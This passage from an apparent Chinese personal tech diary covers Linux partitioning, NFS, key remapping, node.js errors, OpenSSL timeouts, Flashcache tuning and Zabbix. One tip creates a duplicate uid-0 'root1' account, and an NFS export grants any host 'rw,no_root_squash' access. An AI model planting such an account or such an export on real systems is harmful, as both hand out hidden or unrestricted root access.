
   打开VirtualBox，设置虚拟机，挂载ISO文件，启动虚拟机。

 - 启动Gparted

   扩大已有逻辑分区的尺寸以便包含新的未分配空间，使用未分配空间创建新的分区（本文采用ext4文件系统）。

   关闭虚拟机，卸载ISO，启动虚拟机。

 - 临时挂载新分区

   #+begin_src sh
     sudo mount /dev/sda6 /newhome
   #+end_src

 - 将旧内容拷入新分区挂载点

   #+begin_src sh
     sudo cp -a /home/* /newhome/
   #+end_src

 - 清空旧内容

   #+begin_src sh
     sudo rm -r /home
   #+end_src

 - 正式挂载新分区

   #+begin_src sh
     sudo umount /newhome
     sudo mv /newhome /home
     sudo mount /dev/sda6 /home
   #+end_src

 - 写入配置文件

   在 =/etc/fstab=中添加：

   #+begin_example
     /dev/sda6 /home ext4 defaults 0 2
   #+end_example
* TODO php与mysql疑难点                                           :php:mysql:

  - mysql_query进行update返回true表示记录更新成功吗？
    
* DONE 在linux使用nfs挂载其它linux机器上的文件夹                  :linux:nfs:
  CLOSED: [2014-09-23 Tue 16:52]

  下面的IP地址以及工作目录需按实际情况进行修改。

  - 在本地机器上允许目录被远程挂载
    
    #+begin_src sh
      echo '/home/tangxinfa/workdir *(rw,sync,no_root_squash)' >> /etc/exports
      sudo exportfs -arv
    #+end_src

  - 在远程机器上挂载本地机器上的文件夹

    #+begin_src sh
      mkdir /tmp/Projects; mount -t nfs -o nolock 192.168.111.100:/home/tangxinfa/Projects /tmp/Projects
    #+end_src

  问题诊断

  - mount: RPC: Unable to receive; errno = Connection refused

    需要启动nfs-server服务：

    #+begin_src sh
      sudo systemctl enable nfs-server.service
      sudo systemctl start nfs-server.service
    #+end_src

    另外，如果刚刚做了linux内核更新而没有重启系统也可能导致这个问题，重启一下再试。

  - mount: 192.168.111.100:/home/tangxinfa/Projects failed, reason given by server: Permission denied

    在/etc/exports文件中允许目录被远程挂载即可。

* TODO buildbot使用中遇到的问题                             :python:buildbot:

** public_html目录下编译出的APK包用浏览器无法直接下载
   
   配置APK的mime类型即可。

   #+begin_src sh
     echo "application/vnd.android.package-archive   apk" >> /etc/mime.types 
   #+end_src
* DONE linux下修改键位映射                                   :linux:keyboard:
  CLOSED: [2014-09-19 Fri 14:07]

  在linux下会大量使用ctrl和alt键，但是普通键盘上这两个键所在位置太偏，按起来非常吃力，交换键位可以很好的解决这个问题。

  - 通过gnome-tweak-tool进行修改

    Typing页可以完成常用的修改，如：交换Caps Lock和Ctrl，交换左Ctrl和Alt。但是在我的笔记本上设置好后有时候会失效.

  - 通过setxkbmap命令进行修改

    Caps Lock改为Ctrl：setxkbmap -option ctrl:nocaps

    可以查看/usr/share/X11/xkb/rules/evdev.lst查看支持的交换方式。Ctrl和Alt交换试了一下没有效果。

    将setxkbmap设置命令放到~/.xprofile中即可开机生效。


  - 通过配置~/.Xmodmap进行修改

    可以完成任意的键盘映射。

    如下所示：Caps Lock改为Ctrl，左Ctrl改为Alt：
    
    #+begin_example
      keycode 66 = Control_L
      clear Lock
      add control = Control_L
      
      clear control
      clear mod1
      keycode 37 = Alt_L Meta_L
      add control = Control_L Control_R
      add mod1 = Alt_L Meta_L
    #+end_example

    启用设置：

    #+begin_src sh
      xmodmap ~/.Xmodmap
    #+end_src

    在~/.xprofile中添加以上指令以便开机生效：

    #+begin_src sh
      if [ -f $HOME/.Xmodmap ]; then
          /usr/bin/xmodmap $HOME/.Xmodmap
      fi
    #+end_src

    参考：

    + [[http://earthviaradio.wordpress.com/2012/02/06/swapping-the-left-alt-and-ctrl-keys-in-ubuntu-11-10/][Swapping the left Alt and Ctrl keys in Ubuntu 11.10]]

    + [[http://efod.se/writings/linuxbook/html/caps-lock-to-ctrl.html][Changing your caps lock into Ctrl in X]]

    + [[https://wiki.archlinux.org/index.php/Xmodmap_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29][Xmodmap (简体中文)]]

  - 清除xmodmap以及setxkbmap的配置
    
    #+begin_src sh
      setxkbmap -layout us
    #+end_src
    
  - 换hhkb pro2键盘

    linux用户必备，ctrl和alt键已经放置到最优位置，而且后面的跳线开关支持常用的键位交换，即使是linux文本模式下也可用。

* DONE Thinkpad T540p修复linux下触摸板按下时光标位置移动问题 :linux:thinkpad:
  CLOSED: [2014-09-22 Mon 14:29]

  - 执行以下设置命令即可
    
    #+begin_src sh
      synclient HorizHysteresis=30 VertHysteresis=30
    #+end_src

    将上面的命令放到~/.xprofile中，以便重启后仍然生效。

  参考：[[https://blog.lnx.cx/2014/03/20/fedora-20-and-the-thinkpad-t440s-touchpad/][Fedora 20 and the ThinkPad T440s touchpad | Technitribe]]

* TODO 生成gtk库的pdf手册                               :archlinux:linux:gtk:

  [[http://www.gtk.org][gtk官网]] 上只有html格式的手册供下载，但这样就无法在kindle上阅读了，其实gtk采用的文档工具gtk-doc是支持生成pdf的。

  - 安装依赖的工具

    #+begin_src sh
      yaourt -S gtk-doc dblatex
    #+end_src

    如果忘记安装dblatex，则下面的编译不会出错但是不会有pdf文档产生。

  - 从源代码生成pdf文档

    #+begin_src sh
      wget http://ftp.gnome.org/pub/gnome/sources/gtk+/3.10/gtk+-3.10.9.tar.xz
      xz -d gtk+-3.10.9.tar.xz
      tar xvf gtk+-3.10.9.tar
      cd gtk+-3.10.9
      ./configure  --enable-gtk-doc --enable-gtk-doc-pdf
      make
    #+end_src
* DONE 理解node.js中的Error对象                                        :node:
  CLOSED: [2014-12-09 Tue 13:38]

  Error对象在 [[http://nodejs.org][node.js]] 程序中无处不在，但是关于它在 [[http://nodejs.org/docs/latest/api/all.html][node.js文档]] （写这篇文章时node.js的最新版本为v0.10.33）中却找不到描述资料，只在以下部分提及：

  - [[http://nodejs.org/docs/latest/api/all.html#all_util_iserror_object][util.isError(object)]] :: 判断对象是否为Error对象.

  - [[http://nodejs.org/docs/latest/api/all.html#all_additions_to_error_objects][Domain: Additions to Error objects]] :: 在Error对象上附加额外的字段.

** Error到底是何方神圣？
   
   Error对象是在ECMAScript 5.1（于2011年7月发布）中 [[http://www.ecma-international.org/ecma-262/5.1/#sec-15.11][定义]] 的，是一个比较新的特性：

   #+begin_quote
   Instances of Error objects are thrown as exceptions when runtime errors occur. The Error objects may also serve as base objects for user-defined exception classes.
   #+end_quote

   它只有两个属性：

   - name :: 错误名称，默认为"Error"
   
   - message :: 错误消息，默认为""

   V8实现了一个扩展属性：

   - stack :: 错误描述及调用堆栈 
   
   它只有一个方法：
   
   - toString :: 转成字符串形式，通常为 "name: message"
     
   构造一个Error实例：

   new Error(message) 或者 Error(message)，两者是一样的。

   示例：显示错误消息

   #+begin_src js
     console.log(err);
     console.log(err.toString());
     console.log(err.message);
   #+end_src

   需要注意的是console.log(JSON.stringify(err))显示的是空对象{}.

   示例：显示错误消息及调用堆栈
    
   #+begin_src js
     console.log(err.stack);
   #+end_src

   示例：显示错误名称

   #+begin_src js
     console.log(err.name);
   #+end_src

** 如何自定义Error类型？

    #+begin_src js
      function MyError(message) {
        this.message = message || '';
      }

      MyError.prototype = new Error();
      MyError.prototype.constructor = MyError;
      MyError.prototype.name = 'MyError';
    #+end_src

    Error实例类型判断

    #+begin_src js
       var err = new Error("this is error");
       var myerr = new MyError("this is my error");
       err instanceof Error /*true*/
       err instanceof MyError /*false*/
       myerr instanceof MyError /*true*/
       myerr instanceof Error /*true*/
    #+end_src

    stack输出有问题：自定义的错误描述没了
    
    #+begin_src js
      err.stack /*'Error: this is error\n    at repl:1:11 ...*/
      myerr.stack /*'MyError\n    at repl:1:21 ...*/
    #+end_src

    修复node.js下MyError的stack不正确的问题

    #+begin_src js
       function MyError(message) {
         Error.captureStackTrace(this, this.constructor)
         this.message = message || '';
       }

       MyError.prototype = new Error();
       MyError.prototype.constructor = MyError;
       MyError.prototype.name = 'MyError';
     #+end_src

     *最终版：更node.js化一些*

     #+begin_src js
       function MyError(message) {
           if (!(this instanceof MyError)) {
               return new MyError(message);
           }
           Error.captureStackTrace(this, this.constructor)
           this.message = message || '';
       }

       util.inherits(MyError, Error)
       MyError.prototype.name = 'MyError';
     #+end_src

** 参考

  - [[https://docs.nodejitsu.com/articles/errors/what-is-the-error-object][What is the error object?]] :: 对Error对象的成员有所提及，但与当前的node.js版本不一致。

  - [[https://cnodejs.org/topic/52090bc944e76d216af25f6f][Node.js下自定义错误类型]] :: 教你如何自定义错误类型。

  - [[http://stackoverflow.com/questions/10624873/what-properties-does-nodejs-expresss-error-object-exposes][What properties does nodejs express's Error object exposes?]] :: 讨论Error对象相关属性
   
  - [[https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error][MDN > Web technology for developers > JavaScript > JavaScript reference > Standard built-in objects > Error]] :: Error对象参考文档

  - [[http://www.ecma-international.org/ecma-262/5.1/#sec-15.11][Error Objects]] :: Error对象标准文档

* DONE SSL_read及SSL_write支持超时                                :openssl:c:
  CLOSED: [2015-01-27 Tue 14:29]

  原始的socket编程中 =read= 、 =write= 支持超时是很容易实现的，如使用 =select= 或者 =setsockopt= 设置读写超时并在 =read= 和 =write= 出错后根据 =errno= 判断是否为超时引起。

  但是在 =SSL= 编程中对底层socket调用 =select= 以及使用 =errno= 行为是未定义的。

  使用 =setsockopt= 在底层的socket上设置读写后， =SSL_read= 、 =SSL_write= 出错会返回ssl错误码 =SSL_ERROR_WANT_READ= 或 =SSL_ERROR_WANT_WRITE= ，
  但是被信号中断或者底层SSL需要重新握手也会导致 =SSL_read= 、 =SSL_write= 返回同样的ssl错误码。

  如果能够将信号屏蔽掉，并启用SSL自动重新握手，就能够实现 =SSL_read= 、 =SSL_write= 超时检测。
      
  - 屏蔽信号

    忽略应用产生的信号，如：

    #+begin_src c
      signal(SIGPIPE, SIG_IGN);
      signal(SIGCHLD, SIG_IGN);
    #+end_src
  
  - 在底层socket上设置超时

    #+begin_src c
      struct timeval tv;
      tv.tv_sec  = 10;
      tv.tv_usec = 0;
      setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(struct timeval));
      setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(struct timeval));
    #+end_src

  - 启用自动重新握手

    #+begin_src c
      SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
    #+end_src

  - =SSL_read= 和 =SSL_write= 判断是否超时出错

    #+begin_src c
      int readed = SSL_read(ssl, data, size);
      if (readed <= 0) {
          if (SSL_get_error(ssl, readed) == SSL_ERROR_WANT_READ) {
              // timeout
          } else {
              // error
          }
      }

      int writed = SSL_write(ssl, data, size);
      if (writed <= 0) {
          if (SSL_get_error(ssl, writed) == SSL_ERROR_WANT_WRITE) {
              // timeout
          } else {
              // error
          }
      }
    #+end_src

* DONE Archlinux安装文本语音合成（TTS）                       :archlinux:tts:
  CLOSED: [2015-04-15 Wed 20:21]

** 安装 =festival=

   #+begin_src sh
     yaourt -S festival festival-english festival-us
   #+end_src

** 测试运行

   #+begin_src sh
     echo "This is an example. Arch is the best." | festival --tts
   #+end_src

   - 修复错误 =Linux: can't open /dev/dsp=
  
   参考 [[https://wiki.archlinux.org/index.php/Festival#Can.27t_open_.2Fdev.2Fdsp][这里]] 将以下内容添加到 =~/.festivalrc=

   #+begin_src lisp
     (Parameter.set 'Audio_Method 'Audio_Command)
     (Parameter.set 'Audio_Command "aplay -q -c 1 -t raw -f s16 -r $SR $FILE")
   #+end_src
  
** 参考

   https://wiki.archlinux.org/index.php/Festival

   https://linuxtoy.org/archives/festival_on_ubuntu.html

* DONE Node.js服务器TCP死连接问题诊断                          :node:network:
  CLOSED: [2015-04-16 Thu 20:29]

  最近一段时间，由于开发工作开始跟嵌入式相关，开始遇到一个问题：TCP死连接。

  TCP死连接症状是这样的：通信双方从一方系统上看已经断开（不存在），但是另一方系统上看却是连接中（ESTABLISHED状态）。

  TCP死连接一般在一方（或中间线路上的设备）断电、死机后出现，此时由于另一方收不到断开连接的IP报文，会认为连接仍然存在，日积月累会耗光文件描述符空间从而导致性能下降，最终拒绝服务。

  对付这种问题，一般需要双方都进行连接心跳检测。比如：连接空闲一段时间后一方发一个心跳请求，另一端回个心跳响应，心跳请求发送方一段时间后还收不到响应则认为连接已断开，心跳请求接收方一段时间内没有收到心跳请求也认为连接已断开。

  需要注意到的是node.js的tls服务器端握手超时处理不当可能会导致TCP死连接出现，有问题的代码示例如下：

  #+begin_src js
       var options = {
           key: "...",
           cert: "...",
           handshakeTimeout: 10*1000,
           plain: true,
           ssl: true
       };

       var tlsServer = tls.createServer(options, app).listen(5433, 8192, function(){
           logger.log('tls server listening on port 5433');
       });

       tlsServer.on('clientError', function (exception, socket) {
           logger.warn('tls server client(' + socket.remoteAddress + ':' + socket.remotePort +') error(' + exception + ')');
       });
  #+end_src

  上面的代码通过指定 =handshakeTimeout= 使用指定SSL握手超时时间，但是并未关闭底层的TCP连接，从而导致TCP连接泄露，在 =clientError= 事件处理函数中添加以下释放语句即可：

  #+begin_src js
    socket.destroy();
  #+end_src

  除了常见的断电、死机引起TCP死连接外，这里还有一个论坛帖子论坛其它原因：《[[http://serverfault.com/questions/504187/too-many-established-connections-left-open][Too many established connections left open]]》。

  另外还有 linux 内核的 tcp keepalive机制作为心跳解决方案：《[[http://machael.blog.51cto.com/829462/211989/][linux下使用TCP存活(keepalive)定时器]]》。

  谨记：除了主动通过连接发送数据外，其它情况下操作系统可能不会告诉你连接已经关闭了。

  要彻底解决这个问题，除了要避免泄露（或忘记关闭）TCP连接外，要有心跳机制，还需要从代码层面进行防御性编程，如：对于读写操作设置超时时间，一旦超时主动关闭连接。
* DONE linux下通过HTTP同步系统时间                                    :linux:
  CLOSED: [2015-04-21 Tue 11:54]

  在 =NTP= 被禁用的网络环境下，可以通过 =HTTP= 协议从公开的网站（如：www.baidu.com）同步时间，因为HTTP响应通常会带一个Date字段，这是WEB服务器的系统时间，可以用它来设置本机时间。

  #+begin_src sh
    sudo date --rfc-2822 -s "`curl -s -i -X HEAD --header "Connection: close" http://www.baidu.com | grep -E '^Date: ' | awk -F ': ' '{print $2}'`"
  #+end_src
* DONE 在Archlinux上使用FlashCache                     :archlinux:flashcache:
  CLOSED: [2015-04-23 Thu 20:16]

  [[https://github.com/facebook/flashcache/][Flashcache]] 是 [[https://www.facebook.com][Facebook]] 的一个开源项目，通过将固态硬盘（SSD）做为机械硬盘（HDD）的缓存层，提升磁盘I/O性能。

  [[https://github.com/facebook/flashcache/][Flashcache]] 位于磁盘驱动层与文件系统层之间，是一个 =linux= 内核模块。

** 编译安装

   由于Archlinux总是使用最新的linux内核，最好从最新的 [[https://github.com/facebook/flashcache/][Flashcache]] 源代码进行编译安装。

   #+begin_src sh
     git clone https://github.com/facebook/flashcache.git
     cd flashcache
     make
     sudo make install
   #+end_src

** 挂载模块

   #+begin_src sh
     sudo insmod /lib/modules/`uname -r`/extra/flashcache/flashcache.ko
   #+end_src

   - 修复挂载错误

     #+begin_quote
       insmod: ERROR: could not insert module /lib/modules/3.19.3-3-ARCH/extra/flashcache/flashcache.ko: Unknown symbol in module
     #+end_quote

     通过 =dmesg | grep flashcache= 可以看到以下错误信息：

     #+begin_quote
       [ 2130.514615] flashcache: Unknown symbol dm_put_device (err 0)\\
       [ 2130.514654] flashcache: Unknown symbol dm_io_client_create (err 0)\\
       [ 2130.514693] flashcache: Unknown symbol dm_kcopyd_client_create (err 0)\\
       [ 2130.514738] flashcache: Unknown symbol dm_unregister_target (err 0)\\
       [ 2130.514774] flashcache: Unknown symbol dm_io_client_destroy (err 0)\\
       [ 2130.514798] flashcache: Unknown symbol dm_kcopyd_copy (err 0)\\
       [ 2130.514821] flashcache: Unknown symbol dm_register_target (err 0)\\
       [ 2130.514846] flashcache: Unknown symbol dm_kcopyd_client_destroy (err 0)\\
       [ 2130.514870] flashcache: Unknown symbol dm_table_get_mode (err 0)\\
       [ 2130.514895] flashcache: Unknown symbol dm_io (err 0)\\
       [ 2130.514915] flashcache: Unknown symbol dm_get_device (err 0)
     #+end_quote

     先挂载 =dm-mod= 模块再挂载 =flashcache= 模块即可：

     #+begin_src sh
       sudo modprobe dm-mod
       sudo insmod /lib/modules/`uname -r`/extra/flashcache/flashcache.ko
     #+end_src

     参考：[[https://bbs.archlinux.org/viewtopic.php?id=30478][No entry for device-mapper found]]

** 模拟实验

   参考：[[http://my.oschina.net/renguijiayi/blog/303747][flashcache的实现与用法]]

   - 创建SSD模拟设备
   
     使用内存文件模拟块设备（1G）

     #+begin_src sh
       dd if=/dev/zero of=/dev/shm/ssd.img bs=1024k count=1024
       sudo losetup /dev/loop1 /dev/shm/ssd.img
     #+end_src

   - 创建HDD模拟设备

     使用普通磁盘文件模拟块设备（5G）

     #+begin_src sh
       sudo dd if=/dev/zero of=/hdd.img bs=1024k count=5120
       sudo losetup /dev/loop2 /hdd.img
     #+end_src

   - 创建Flashcache混合设备
     
     #+begin_src sh
       sudo flashcache_create -p around cachedev /dev/loop1 /dev/loop2
       sudo mkfs.ext4 /dev/mapper/cachedev
     #+end_src
     
   - 挂载Flashcache混合设备

     #+begin_src sh
       sudo mkdir /data
       sudo mount /dev/mapper/cachedev /data
     #+end_src

   /data目录下的数据读写就已经在使用Flashcache了。

   - 创建用来测试的数据文件（1G）

     #+begin_src sh
       dd if=/dev/urandom of=/dev/shm/test.dat bs=1024k count=1024
     #+end_src

   - 测算使用HDD写耗时
     
     #+begin_src sh
       sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /'
     #+end_src

     输出：

     #+begin_example
       real    0m4.751s
       user    0m0.000s
       sys 0m0.600s
     #+end_example

   - 测算使用HDD读耗时

     #+begin_src sh
       sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches; time cp /test.dat /dev/shm/
     #+end_src
     
     输出：

     #+begin_example
       real    0m10.580s
       user    0m0.010s
       sys 0m0.727s
     #+end_example

   - 测算使用Flashcache写耗时

     #+begin_src sh
       sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /data/'
     #+end_src

     输出：

     #+begin_example
       real    0m7.363s
       user    0m0.000s
       sys 0m0.760s
     #+end_example

   - 测算使用Flashcache读耗时

     第一轮测试（缓存预热）

     #+begin_src sh
       sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'
     #+end_src

     输出：

     #+begin_example
       real    0m9.557s
       user    0m0.013s
       sys 0m1.157s
     #+end_example

     第二轮测试（缓存生效）

     #+begin_src sh
       sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'
     #+end_src

     输出：

     #+begin_example
       real    0m3.107s
       user    0m0.000s
       sys 0m0.850s
     #+end_example

   - 清除测试数据

     #+begin_src sh
       sudo rm /test.dat /dev/shm/test.dat /data/test.dat
     #+end_src
     
   - 结果分析

     + Flashcache读性能： *提升70%*

     + Flashcache写性能： *降低55%*

     因为使用了 =Write-Around= 方式，所以提升了读性能，降低了写性能。

   - 清除模拟环境

     #+begin_src sh
       sudo umount /data
       sudo dmsetup remove cachedev
       sudo losetup -d /dev/loop1
       sudo rm /dev/shm/ssd.img
       sudo losetup -d /dev/loop2
       sudo rm /hdd.img
       sudo rmdir /data
     #+end_src

* DONE FlashCache多盘方案实战                         :linux:flashcache:RAID:
  CLOSED: [2015-04-29 Wed 17:38]

  目标系统为单SSD+多HDD，将多HDD创建为RAID5逻辑盘，然后使用FlashCache将SSD做为RAID5逻辑盘的缓存。

** 系统信息

   - OS
     
     CentOS release 6.5 (Final) x86_64

   - CPU

     8

     Intel(R) Atom(TM) CPU  C2750  @ 2.40GHz

   - MEMORY

     4

     TOTAL 16G
   
   - HDD

     4

     WDC WD4000FYYZ-0 4TB 7200转

     /dev/sdc /dev/sdd /dev/sde /dev/sdf

   - SSD

     1

     INTEL SSDSC2BB30 300GB

     /dev/sdb

** 卸载HDD及SSD盘

   #+begin_src sh
     umount /dev/sdc /dev/sdd /dev/sde /dev/sdf /dev/sdb
   #+end_src

   确保系统重启后不会自动挂载这些盘。

** 将多HDD创建为RAID5逻辑盘

   - 格式化HDD盘

     #+begin_src sh
       parted /dev/sdc
       (parted) mklabel gpt
       (parted) unit TB
       (parted) mkpart primary 0.00TB 4.00TB
       (parted) print
     #+end_src

     其它HDD盘也做如上处理.

   - 创建RAID5逻辑分区

     #+begin_src sh
       mdadm --create /dev/md0 --level=raid5 --raid-devices=4 /dev/sd[c-f]1
       parted /dev/md0
       (parted) mklabel gpt
       (parted) unit TB
       (parted) mkpart primary 0.00TB 12.00TB
       (parted) print
       (parted) quit
     #+end_src

   - 保存RAID5配置

     #+begin_src sh
       mdadm --detail --scan > /etc/mdadm.conf
     #+end_src

     参考：[[https://raid.wiki.kernel.org/index.php/RAID_setup#Saving_your_RAID_configuration][Saving your RAID configuration]]

** 安装Flashcache
   
   #+begin_src sh
     wget https://github.com/facebook/flashcache/archive/stable_v3.1.3.zip -O flashcache_stable_v3.1.3.zip
     unzip flashcache_stable_v3.1.3.zip
     cd flashcache-stable_v3.1.3
     make
     make install
     modprobe flashcache
   #+end_src

** 创建Flashcache混合设备

   #+begin_src sh
     flashcache_create -p around cachedev /dev/sdb /dev/md0p1
     mkfs.ext4 /dev/mapper/cachedev
   #+end_src

** 挂载Flashcache混合设备

   #+begin_src sh
     mkdir /data
     mount /dev/mapper/cachedev /data
   #+end_src

** 系统重启后需要重新创建并挂载Flashcache设备

   #+begin_src sh
     flashcache_create -p around cachedev /dev/sdb /dev/md0p1
     mount /dev/mapper/cachedev /data
   #+end_src

   注意：使用除 =writethrough= 和 =writearound= 以外的模式需要使用 =flashcache_load= 重新创建设备。

** 写入速度测试

   循环创建60MiB大小的文件，测得的磁盘写入速度为 *35.6MiB* ，磁盘读取速度为 *2.1MiB* 。

** 读取速度测试

   - 500并发120G文件每次读取32KB顺序读取

     + 请求处理速度
       
       2107
       
     + 传输速度
       
       132.35MiB/s

   - 500并发500G文件每次读取32KB顺序读取

     + 请求处理速度
       
       1937
       
     + 传输速度
       
       61.09MiB

   - 500并发1T文件每次读取32KB顺序读取

     + 请求处理速度
       
       1574
       
     + 传输速度
       
       49.64MiB/s

   - 500并发120G文件每次读取64KB顺序读取

     + 请求处理速度
       
       5006
       
     + 传输速度
       
       157.88MiB/s

   - 500并发500G文件每次读取64KB顺序读取

     + 请求处理速度
       
       897
       
     + 传输速度
       
       56.37MiB/s

   - 500并发1T文件每次读取64KB顺序读取

     + 请求处理速度
       
       782
       
     + 传输速度
       
       49.10MiB/s

** 注意事项

   - 重建（rebuild）

     当一块盘坏掉后，如果配置了热备盘（Hot spare disk），会自动重建，请将坏盘换掉并配置成热备盘；\
     如果未配置热备盘，读性能会下降（坏盘中的数据需要全部通过计算重现），请将坏盘换掉系统会自动进行重建。

** 潜在的优化选项

   - 开启SSD写Cache

   - 禁用文件、目录访问时间戳

     noatime,nodiratime

   - =Write-Back= 模式优化

     #+begin_src sh
       sysctl -w dev.flashcache.sdb+md0p1.dirty_thresh_pct=80
     #+end_src


** 卸载Flashcache设备

   #+begin_src sh
     umount /dev/mapper/cachedev
     dmsetup remove cachedev
   #+end_src

** Q&A

   - 重新调整 Flashcache 选项会不会删除数据？
     
     =writethrough= 、 =writearound= 模式不会，其它的会。

** 相关参考

  - 《[[http://lzw.me/a/linux-lvm.html][Linux LVM逻辑卷管理详细介绍]]》 :: 非常好的LVM入门文章

  - 《[[http://www.linux-mag.com/id/7582/][Pick Your Pleasure: RAID-0 mdadm Striping or LVM Striping?]]》 :: LVM与RAID-0的比较
    
  - 《[[http://www.tecmint.com/create-raid0-in-linux/][Creating Software RAID0 (Stripe) on ‘Two Devices’ Using ‘mdadm’ Tool in Linux – Part 2]]》 :: 构建RAID-0教程

  - 《[[http://zengrong.net/post/2014.htm][在CentOS 6.1上配置 4TB硬盘+RAID1]]》 :: 使用 =parted= 代替 =fdisk= 对大于2TB的硬盘进行分区
    
  - 《[[http://wiki.mikejung.biz/Software_RAID][Software RAID - How to Optimize Software RAID on Linux using Mdadm]]》 :: 优化RAID

  - 《[[http://sysadmin.blog.51cto.com/83876/236802][RAID5单盘故障读写分析]]》 :: RAID5一块盘坏掉后的情形分析

* DONE Flashcache优化                                            :flashcache:
   CLOSED: [2015-05-22 Fri 18:12]

- 调整 dev.flashcache.<cache name>.dirty_thresh_pct

  脏缓存回写阈值（百分比），默认 =20= 。
  
  仅 =Write-Back= 模式下有效。

  调大该值可以减轻写压力（缓存数据写入HDD及元数据写入SSD），缓存已满时该缓存块不能被淘汰，减少了可用缓存空间。

  如果最近写入的数据很可能是热数据，可以考虑调大该值，建议调到 =90= ：

  #+begin_src sh
    sysctl -w dev.flashcache.<cache name>.dirty_thresh_pct=90
  #+end_src

- 调整 dev.flashcache.reclaim_policy

  缓存空间回收策略，默认 =FIFO(0)= 。

  改为 =LRU(1)= :

  #+begin_src sh
    sysctl -w dev.flashcache.<cache name>.reclaim_policy=1
  #+end_src

- 辅助调试

  + 统计清零

    #+begin_src sh
      sysctl -w dev.flashcache.<cache name>.zero_stats=1
    #+end_src

  + 快速停止

    Flashcache在停止时会将SSD中的脏数据写回到HDD中，这是非常耗时的，会导致关机慢。

    手工快速停止

    #+begin_src sh
      service flashcache forcestop
    #+end_src

    总是快速停止

    #+begin_src sh
      sysctl -w dev.flashcache.sdb+sdc1.fast_remove=1
    #+end_src
* DONE emacs启动速度优化                                              :emacs:
  CLOSED: [2015-05-24 Sun 11:17]

  emacs装了很多插件后，启动越来越慢了，最近发现启动一次要25秒，赶得上操作系统启动时间了，是时候优化一下启动速度了。

  - 裸启动emacs
    
    #+begin_src sh
      emacs --quick
    #+end_src

    尽然耗时10秒，网上查了一下这个问题常见于 =archlinux= ，是网络配置引起: [[https://wiki.archlinux.org/index.php/Emacs#Incorrect_network_configuration][Emacs - Slow startup - Incorrect network configuration]]
    
    解决方案就是将主机名（ =hostname= 命令输出）加到 =/etc/hosts= 中：

    #+begin_example
      127.0.0.1   localhost.localdomain   localhost <hostame>
      ::1     localhost.localdomain   localhost  <hostname>
    #+end_example

    再试，emacs瞬间启动。

  - 不加载个人配置文件启动emacs

    #+begin_src sh
      emacs --no-init-file
    #+end_src
    
    emacs瞬间启动。
    
  - 不加载最近保存的桌面启动emacs
    
    #+begin_src sh
      emacs --no-desktop
    #+end_src
    
    耗时15秒，看来是个人配置的问题了

  - 从前面开始一块一块反注释emacs配置，看是卡在哪里
    
    #+begin_src lisp
      (require 'anything-config)
    #+end_src

    这一句耗时11秒，注释掉，现在启时时间为5秒，可以接受了。
* DONE Zabbix添加Flashcache监控                           :flashcache:zabbix:
  CLOSED: [2015-05-29 Fri 16:27]

** 下载 =Zabbix= 的 =Flashcache= 开源模板

   #+begin_src sh
     git clone https://github.com/lesovsky/zabbix-extensions.git
   #+end_src

** 设置 =zabbix_agentd=

   #+begin_src sh
     # 安装配置文件
     cp zabbix-extensions/files/flashcache/flashcache.conf /usr/local/etc/zabbix_agentd.conf.d/
     # 安装脚本
     mkdir /usr/local/etc/zabbix_scripts
     cp zabbix-extensions/files/flashcache/scripts/* /usr/local/etc/zabbix_scripts/
     # 修改配置文件中引用的脚本路径
     sed --in-place -e 's/\/usr\/libexec\/zabbix-extensions\//\/usr\/local\/etc\/zabbix_/g' /usr/local/etc/zabbix_agentd.conf.d/flashcache.conf
     # 包含配置文件目录
     sed --in-place -e 's/# Include=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//Include=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//g' /usr/local/etc/zabbix_agentd.conf
   #+end_src

   重启 =zabbix_agentd= 生效配置。

** 设置 =Zabbix= 后台

   - 导入 =Flashcache= 模板
     
     Configuration -> Templates -> Import -> Import file 选择之前下载的 =zabbix-extensions/files/flashcache/flashcache-template.xml=
     
   - 应用 =Flashcache= 模板
     
     Configuration -> Hosts 下选择要应用到的主机 -> Templates -> Link new templates 选择 =Flashcache-Template=
* DONE linux下创建另一个root帐号                                      :linux:
  CLOSED: [2015-06-04 Thu 20:27]

  #+begin_src sh
    useradd -g 0 -u 0 -o root1
  #+end_src

  上面的命令创建了一个和 =root= 帐号几乎一模一样的帐号 =root1= ，这个帐号登录后甚至连 =$USER= 环境变量都是 =root=， 应该是由于 =uid= 和 =root= 帐号一样都是 =0= ，所以使用了 =root= 帐号的用户名，但是可以指定不同的 =HOME= 以及密码等。
* DONE 今天开始ediary项目                                              :ediary:
  CLOSED: [2015-05-30 Sat 15:26]

  又折腾了一上午的 [[https://github.com/renard/o-blog][o-blog]] ，总是少了几个 =js= 文件，最近升级了 =emacs= 中的所有包后 [[http://blog.kankanan.com][我的博客]] 总算是歇菜了，使用 [[https://github.com/renard/o-blog][o-blog]] 写了两年博客，过程还是很愉快的，除了升级系统后偶尔会有兼容性问题，需要耗费时间修复外，写起博客来很方便，有时候工作相关的调研项目也忍不住发布到博客上，然后把链接发出去。不过考虑到我使用的系统（Archlinux）更新得太勤快了，使用的博客系统一定要够简单直观，我可以改得动。

  我想是时候按自已的想法写一个类似的项目了，这个项目的核心功能一定要精简，专注于日记功能，最好能把展示层剥离出去， =jquery= 和 =bootstrap= 实在是太重了，展示日志用得着这么重的东西吗？

  核心应该是数据结构，日志的信息包含：标题（title）、标签（tags）、发布日期（timestamp）、正文（source）加上可选的短名称（slug）用于生成链接。而最基础的功能就是从日志文本中提取这些信息。接下来根据这些信息来生成待发布的日志文件，以及与现有的发布系统（如：wordpress、git pages）的对接就可以独立进行开发了，而且应该可以互相替换。

  接下来要完成的第一个任务就是解析本日志文件。

* DONE 第一个任务解析日志文件顺利完成                                 :ediary:
  CLOSED: [2015-05-30 Sat 16:58]

